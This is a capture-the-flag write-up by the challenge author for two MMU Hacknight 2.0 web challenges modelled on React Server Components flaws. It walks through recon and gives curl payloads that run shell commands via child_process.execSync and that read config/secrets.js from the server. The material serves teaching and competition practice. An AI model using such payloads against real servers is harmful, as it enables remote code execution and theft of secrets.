# MMU HACKNIGHT 2.0 WEB CTF Challenges 

## AUTHOR
MUA EMMANUEL - CTF PLAYER | MENTOR | SOFTWARE ENGINEER | WEB 3 & SMART CONTRACT | SECURITY RESEARCHER

Being part of the large cybersecurity community in Kenya and an active participant in the field in different entities/initiatives such as Cybersensei-EH, Cyberchief Circle and others, It was an honour to partake in this CTF as a challenge creator. Being a developer, in this CTF i chose to craft this amazing looking websites which felt secure at glance but for a keen security researcher was quite a gold mine. With the great Vibe coding saying that goes "Bora inawork Usiguse" there comes the adage of Security researchers "Grabbing starts with caressing & touching" and thats how they grab your system when they touch what you ignored when your system worked. So lets find what was expected:

### Two Challenges Based on Real REACT 2025 CVEs

---

## Overview

Both challenges simulate vulnerabilities discovered in React Server Components (RSC)
in late 2025. Players interact with what appears to be a normal website and must
identify and exploit the hidden vulnerability to capture the flag.

| Challenge | CVE | Type | Difficulty |
|-----------|-----|------|------------|
| Challenge 1 — NextMart | CVE-2025-55182 | Remote Code Execution | Medium |
| Challenge 2 — SenseiCloud | CVE-2025-55183 | Source Code Exposure | Easy–Medium |

---

---

# Challenge 1 — NextMart
## CVE-2025-55182 (React2Shell) — Remote Code Execution

**URL:** `nextmart.marulahomedecor.net`

---

### Background

The React "Flight" protocol is used by React Server Components to communicate
between the client and server. In versions 19.0.0–19.2.2, the Flight deserializer
processed incoming HTTP payloads without input validation, allowing an attacker to
load arbitrary Node.js modules and call arbitrary methods — including
`child_process.execSync()` — leading to full Remote Code Execution.

---

### Step 1 — Reconnaissance

Visit the site. It looks like a normal e-commerce store. Nothing suspicious on the
surface.

Start with the basics:

```
GET /robots.txt
```

You will find a disallowed path that hints at an internal endpoint.

Next, look for framework metadata:

```
GET /_next/buildManifest.json
```

This reveals:
- The RSC endpoint path
- The expected Content-Type for requests
- The Next.js version in use

---

### Step 2 — Understanding the Vulnerability

The RSC Flight protocol uses a wire format where each row follows this pattern:

```
<rowId>:<tag><value>
```

Two tags are relevant:

| Tag | Meaning | Example |
|-----|---------|---------|
| `I` | Import — loads a Node.js module | `0:I["child_process","execSync"]` |
| `C` | Call — invokes a method on a loaded module | `1:C[0,"execSync",["id"]]` |

The server processes these tags without any validation, meaning an attacker can
load any built-in Node.js module and call any method on it.

---

### Step 3 — Crafting the Payload

Send a POST request to the Flight endpoint with two rows:

**Row 0** — load `child_process`:
```
0:I["child_process","execSync"]
```

**Row 1** — call `execSync` with a shell command:
```
1:C[0,"execSync",["whoami",{"encoding":"utf8"}]]
```

Full request:

```bash
curl -X POST https://nextmart.marulahomedecor.net/_next/flight \
  -H "Content-Type: text/x-component" \
  -d $'0:I["child_process","execSync"]\n1:C[0,"execSync",["whoami",{"encoding":"utf8"}]]'
```

---

### Step 4 — Capture the Flag

Once you confirm RCE with `whoami`, read the flag file:

```bash
curl -X POST https://nextmart.marulahomedecor.net/_next/flight \
  -H "Content-Type: text/x-component" \
  -d $'0:I["child_process","execSync"]\n1:C[0,"execSync",["cat .flag",{"encoding":"utf8"}]]'
```

The flag will appear in the response under the `result` field of row `1`.

---

### What the Response Looks Like

```json
{
  "rows": [
    { "row": "0", "tag": "I", "loaded": "child_process" },
    { "row": "1", "tag": "C", "result": "sensei{...}" }
  ]
}
```

---

### Tools That Help

| Tool | Use |
|------|-----|
| `curl` | Sending crafted HTTP requests |
| Burp Suite | Intercepting and replaying requests |
| `browser DevTools` | Viewing page source for hints |

---

---

# Challenge 2 — SenseiCloud
## CVE-2025-55183 — Source Code Exposure

**URL:** `https://sensei.marulahomedecor.net`

---

### Background

React Server Components include a sourcemap feature intended for development
tooling. In vulnerable versions, this feature was not gated by environment
checks, meaning it remained active in production. By sending a specially crafted
`$S` (sourcemap) directive in an RSC payload, an attacker can force the server
to read and return any source file — including configuration files containing
API keys, database credentials, and secrets.

---

### Step 1 — Reconnaissance

Visit the site. It looks like a normal SaaS dashboard. Start enumeration:

```
GET /robots.txt
```

This reveals a disallowed path pointing to the RSC endpoint.

Then fetch the app manifest:

```
GET /_next/static/chunks/app-manifest.json
```

This reveals:
- The RSC endpoint path
- The **sourcemap tag** used to trigger file inclusion
- The server's source root directory

Pay close attention to every field in the manifest.

---

### Step 2 — Understanding the Vulnerability

The RSC endpoint accepts payloads in Flight wire format. The `$S` directive
tells the server to include a source file in the response:

```
$S<filepath>
```

The server resolves `<filepath>` relative to its source root and returns the
full file contents. There is no restriction on which files can be requested
as long as they have a `.js` extension.

---

### Step 3 — Identifying the Target File

Think about what files a Node.js application typically has that would contain
secrets. Common targets:

```
config/secrets.js
config/env.js
.env.js
config/database.js
```

The `robots.txt` and manifest give you clues about the application structure.

---

### Step 4 — Crafting the Payload

Send a POST request to the RSC endpoint with a `$S` row pointing at the
secrets file:

```bash
curl -X POST https://sensei.marulahomedecor.net/api/rsc \
  -H "Content-Type: text/x-component" \
  --data-binary $'$Sconfig/secrets.js'
```

---

### Step 5 — Capture the Flag

The server returns the full contents of `secrets.js`. Read through the
leaked source code carefully — the flag is embedded among the other secrets.

---

### What the Response Looks Like

```json
{
  "rsc": [
    {
      "type": "sourcemap",
      "file": "config/secrets.js",
      "content": "module.exports = {\n  db: { ... },\n  ctf_flag: 'sensei{...}'\n}"
    }
  ]
}
```

---

### Tools That Help

| Tool | Use |
|------|-----|
| `curl` | Sending crafted HTTP requests |
| Burp Suite | Intercepting and modifying requests |
| `browser DevTools` | Reading JSON responses cleanly |

---

---

## General Tips for Both Challenges

- Always start with `robots.txt` — it is the most overlooked file in web recon
- Read every JSON response carefully, not just the status code
- Understand the technology stack before trying to exploit it — knowing what
  React Server Components are makes both challenges much clearer
- For Challenge 1, think about what Node.js built-in modules can execute commands
- For Challenge 2, think about what files a production Node.js app keeps secret

---

## Real World References

- [React Security Advisory — CVE-2025-55182](https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components)
- [React Security Advisory — CVE-2025-55183](https://react.dev/blog/2025/12/11/denial-of-service-and-source-code-exposure-in-react-server-components)
- [OWASP A08 — Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)
- [CWE-502 — Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)

---

*MMU HACKNIGHT 2.0 | MUA EMMANUEL / CYBERSENSEI-EH |2026*
